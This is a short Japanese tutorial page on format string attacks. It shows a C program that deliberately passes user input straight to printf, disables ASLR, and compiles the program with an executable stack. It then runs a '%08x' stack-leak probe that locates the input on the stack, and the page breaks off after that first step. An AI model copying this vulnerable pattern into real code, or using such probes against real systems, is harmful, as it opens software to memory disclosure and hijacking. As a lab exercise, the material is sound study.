<!-- TITLE: Format String Attack -->
<!-- SUBTITLE: A quick summary of Format String Attack -->

# FSBのコード

ももいろテクノロジー様の記事を参考に進めていく[^1]


```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[100];
    printf("[+] buf = %p\n", buf);
    strncpy(buf, argv[1], 100);
    printf(buf);
    putchar('\n');
    return 0;
}
```

# コンパイル

```sh
$ sudo sysctl -a | grep kernel.randomize_va_space
kernel.randomize_va_space = 2
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
$ gcc -m32 -z execstack fsb.c -o fsb
$ ./fsb $(python -c 'print "AAAA" + ".%08x"*16')
[+] buf = 0xffffd1e8
AAAA.ffffd517.00000064.00f0b5ff.ffffd20e.00000001.000000c2.ffffd304.ffffd20e.ffffd310.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
```

最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されている

# 